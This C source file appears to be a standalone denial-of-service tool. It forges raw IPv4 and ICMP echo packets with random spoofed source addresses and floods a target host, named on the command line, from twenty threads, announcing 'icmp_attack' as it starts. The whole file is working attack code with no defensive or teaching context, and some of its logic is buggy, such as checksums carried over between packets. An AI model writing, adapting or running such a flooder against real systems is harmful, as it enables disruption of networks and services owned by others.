#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h> 
#include <pthread.h>
#include <arpa/inet.h>

#define MAXCHILD 20
unsigned int dest_ip=0;
int PROTO_ICMP=-1;
int alive=-1;
int rawsock;


unsigned short checksum (unsigned short *buffer, unsigned short size)     
{  

	unsigned long cksum = 0;
	
	while(size>1){
		cksum += *buffer++;
		size  -= sizeof(unsigned short);
	}
	
	if(size){
		cksum += *(unsigned char *)buffer;
	}
	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	
	return((unsigned short )(~cksum));
}

void sigfun(int signo)
{
	alive=0;

}


void*Dos_icmp()
{
	struct sockaddr_in to;
	struct ip iph;
	struct icmp icmph;
	char buf[200];
	char sendbuf[200];
	int data[16];

	for(int j=0;j<16;j++)
	{
		data[j]=1;
	}

	int len=sizeof(struct ip)+sizeof(struct icmp)+64;//经过网络层封装的ICMP数据报长度

	

	memset(buf,0,sizeof(buf));

	iph.ip_v=4;
	iph.ip_hl=5;
	iph.ip_tos=0;
	iph.ip_len=htons(len);
	iph.ip_id=htons(getpid());
	iph.ip_off=0x0000;
	iph.ip_ttl=255;
	iph.ip_p=PROTO_ICMP;
	iph.ip_sum=0;
	iph.ip_src.s_addr=htonl(rand());
	iph.ip_dst.s_addr=dest_ip;

	icmph.icmp_type=ICMP_ECHO;//类型
	icmph.icmp_code=0;//代码
	icmph.icmp_cksum=0;

	to.sin_family=AF_INET;
	to.sin_addr.s_addr=dest_ip;
	to.sin_port=htons(0);

	int count=0;
	while(alive)
	{
		//设置乱序发送地址
		iph.ip_src.s_addr=htonl(rand());
		//检验和设置 IP头部检验和 ICMP首部+数据检验和
		bzero(buf,sizeof(buf));
		memcpy(buf,&iph,sizeof(struct ip));
		iph.ip_sum=checksum((unsigned short*)buf,sizeof(struct ip));

		bzero(buf,sizeof(buf));
		memcpy(buf,&icmph,sizeof(struct icmp));
		memcpy(buf+sizeof(struct icmp),(char*)&data,16*sizeof(int));
		icmph.icmp_cksum=checksum((unsigned short*)buf,sizeof(struct icmp)+16*sizeof(int));

		bzero(sendbuf,sizeof(sendbuf));
		memcpy(sendbuf,&iph,sizeof(struct ip));
		memcpy(sendbuf+sizeof(struct ip),&icmph,sizeof(struct icmp));
		memcpy(sendbuf+sizeof(struct ip)+sizeof(struct icmp),(char*)&data,16*sizeof(int));


		if(sendto(rawsock,sendbuf,len,0,(struct sockaddr*)&to,sizeof(struct sockaddr))<0)
		{
			perror("sendo() error!\n");
			pthread_exit("fail");
		}
		sleep(1);
		count++;

	}

}

int main(int argc,char**argv)
{
	struct hostent*host=NULL;
	struct protoent*protocol=NULL;
	int i=0;
	int err=-1;
	pthread_t pthread[MAXCHILD];
	
	alive=1;

	signal(SIGINT,sigfun);

	srand((unsigned) time(NULL));

	if(argc<2)
		return -1;

	protocol=getprotobyname("icmp");
	if(protocol==NULL)
	{
		perror("getprotobyname() error!\n");
		return -1;
	}
	PROTO_ICMP=protocol->p_proto;

	dest_ip=inet_addr(argv[1]);
	if(dest_ip==INADDR_NONE)
	{
		host=gethostbyname(argv[1]);
		if(host==NULL)
		{
			perror("gethostbyname() error!\n");
			return -1;
		}
		memcpy((char*)&dest_ip,host->h_addr,host->h_length); //Remember to transfer the type of dest_ip to char
	}

	printf("Now icmp_attack IP=(%d.%d.%d.%d).\n",(dest_ip&0x000000FF)>>0,(dest_ip&0x0000FF00)>>8,(dest_ip&0x00FF0000)>>16,(dest_ip&0xFF000000)>>24);

	rawsock=socket(AF_INET,SOCK_RAW,PROTO_ICMP);
	if(rawsock<0)
	{
		perror("socket() error!\n");
		return -1;
	}

	int on=1;
	if(setsockopt(rawsock,IPPROTO_IP,IP_HDRINCL,(char*)&on,sizeof(on))<0)
	{
		perror("setsockopt() error!\n");
		return -1;
	}

	for(int i=0;i<MAXCHILD;i++)
	{
		err=pthread_create(&pthread[i],NULL,Dos_icmp,NULL);
		if(err!=0)
		{
			perror("pthread_create() error!\n");
			return -1;
		}
		printf("%d-th thread open!\n",i);
		sleep(0.01);
	}
	for(int i=0;i<MAXCHILD;i++)
	{
		pthread_join(pthread[i],NULL);
	}
	close(rawsock);

	return 0;

}
